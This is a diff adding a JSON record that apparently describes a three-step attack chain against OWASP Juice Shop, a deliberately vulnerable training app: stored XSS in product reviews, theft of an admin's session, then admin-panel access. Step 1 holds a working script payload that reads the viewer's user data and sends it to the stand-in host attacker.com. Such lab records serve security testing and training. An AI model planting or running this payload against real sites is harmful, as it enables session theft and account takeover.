@@ -1,0 +1,57 @@
+{
+  "title": "Juice Shop - XSS to Admin Account Takeover",
+  "description": "Stored XSS in product review leads to session hijacking and admin access",
+  "steps": [
+    {
+      "step_number": 1,
+      "vulnerability_type": "Cross-Site Scripting",
+      "description": "Stored XSS in product review comment field",
+      "endpoint": "/rest/products/{id}/reviews",
+      "payload": "<script>fetch('/rest/user/whoami', {credentials: 'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?token='+btoa(JSON.stringify(d))))</script>",
+      "prerequisites": [],
+      "outcome": "XSS payload stored in product review",
+      "evidence": null
+    },
+    {
+      "step_number": 2,
+      "vulnerability_type": "Session Hijacking",
+      "description": "Admin views product review, XSS executes in admin context, session token stolen",
+      "endpoint": "/#/search?q=...",
+      "payload": null,
+      "prerequisites": [
+        "XSS payload stored in product review"
+      ],
+      "outcome": "Admin session token obtained by attacker",
+      "evidence": null
+    },
+    {
+      "step_number": 3,
+      "vulnerability_type": "Privilege Escalation",
+      "description": "Use stolen admin session token to access admin panel",
+      "endpoint": "/#/administration",
+      "payload": null,
+      "prerequisites": [
+        "Admin session token obtained by attacker"
+      ],
+      "outcome": "Full admin access to Juice Shop",
+      "evidence": null
+    }
+  ],
+  "impact": "Critical",
+  "severity": "Critical",
+  "prerequisites": [
+    "Valid user account",
+    "Ability to post product reviews"
+  ],
+  "context": "OWASP Juice Shop e-commerce application",
+  "discovered_by": null,
+  "discovered_at": "2025-12-30T20:58:45.420171",
+  "validated": false,
+  "tags": [
+    "xss",
+    "juice-shop",
+    "session-hijacking",
+    "privilege-escalation",
+    "web"
+  ]
+}
